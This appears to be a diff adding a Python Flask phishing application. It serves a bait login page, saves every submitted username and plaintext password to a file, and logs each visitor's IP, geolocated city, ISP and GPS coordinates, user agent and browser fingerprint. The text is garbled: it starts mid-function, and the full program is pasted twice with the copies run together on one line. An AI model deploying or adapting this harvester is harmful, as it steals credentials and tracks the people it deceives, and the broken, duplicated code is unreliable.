@@ -1,0 +1,130 @@
+:
+        response = requests.get(f"https://ipinfo.io/{ip}/json")
+        if response.status_code == 200:
+            data = response.json()
+            city = data.get("city", "Unknown")
+            region = data.get("region", "Unknown")
+            country = data.get("country", "Unknown")
+            org = data.get("org", "Unknown")
+            loc = data.get("loc", "Unknown")
+            return f"{city}, {region}, {country} | ISP: {org} | GPS: {loc}"
+        else:
+            return "Location lookup failed"
+    except:
+        return "Error fetching location"
+
+@app.route('/')
+def index():
+    # Set cookie for tracking
+    resp = make_response(render_template('login.html'))
+    resp.set_cookie('bait_id', 'phizzytrap001')
+    return resp
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    referrer = request.referrer or "None"
+    lang = request.headers.get('Accept-Language', 'Unknown')
+    bait_id = request.cookies.get('bait_id', 'None')
+    location = get_location(ip)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    with open("logins.txt", "a") as file:
+        file.write(f"\n[Login Attempt - {timestamp}]\n")
+        file.write(f"Username: {username} | Password: {password}\n")
+        file.write(f"IP: {ip}\n")
+        file.write(f"Location: {location}\n")
+        file.write(f"Referrer: {referrer}\n")
+        file.write(f"Lang: {lang}\n")
+        file.write(f"User-Agent: {user_agent}\n")
+        file.write(f"Bait Cookie: {bait_id}\n")
+        file.write("-" * 50 + "\n")
+
+    return render_template('loading.html')
+
+@app.route('/fingerprint', methods=['POST'])
+def fingerprint():
+    data = request.get_json()
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with open("fingerprints.txt", "a") as f:
+        f.write(f"[{timestamp}] From IP: {ip}\n")
+        for key, value in data.items():
+            f.write(f"{key}: {value}\n")
+        f.write("-" * 50 + "\n")
+    return '', 204
+
+if __name__ == '__main__':
+    app.run(debug=True)from flask import Flask, request, render_template, make_response
+from datetime import datetime
+import requests
+
+app = Flask(__name__)
+
+def get_location(ip):
+    try:
+        response = requests.get(f"https://ipinfo.io/{ip}/json")
+        if response.status_code == 200:
+            data = response.json()
+            city = data.get("city", "Unknown")
+            region = data.get("region", "Unknown")
+            country = data.get("country", "Unknown")
+            org = data.get("org", "Unknown")
+            loc = data.get("loc", "Unknown")
+            return f"{city}, {region}, {country} | ISP: {org} | GPS: {loc}"
+        else:
+            return "Location lookup failed"
+    except:
+        return "Error fetching location"
+
+@app.route('/')
+def index():
+    # Set cookie for tracking
+    resp = make_response(render_template('login.html'))
+    resp.set_cookie('bait_id', 'phizzytrap001')
+    return resp
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    referrer = request.referrer or "None"
+    lang = request.headers.get('Accept-Language', 'Unknown')
+    bait_id = request.cookies.get('bait_id', 'None')
+    location = get_location(ip)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    with open("logins.txt", "a") as file:
+        file.write(f"\n[Login Attempt - {timestamp}]\n")
+        file.write(f"Username: {username} | Password: {password}\n")
+        file.write(f"IP: {ip}\n")
+        file.write(f"Location: {location}\n")
+        file.write(f"Referrer: {referrer}\n")
+        file.write(f"Lang: {lang}\n")
+        file.write(f"User-Agent: {user_agent}\n")
+        file.write(f"Bait Cookie: {bait_id}\n")
+        file.write("-" * 50 + "\n")
+
+    return render_template('loading.html')
+
+@app.route('/fingerprint', methods=['POST'])
+def fingerprint():
+    data = request.get_json()
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with open("fingerprints.txt", "a") as f:
+        f.write(f"[{timestamp}] From IP: {ip}\n")
+        for key, value in data.items():
+            f.write(f"{key}: {value}\n")
+        f.write("-" * 50 + "\n")
+    return '', 204
+
+if __name__ == '__main__':
+    app.run(debug=True)
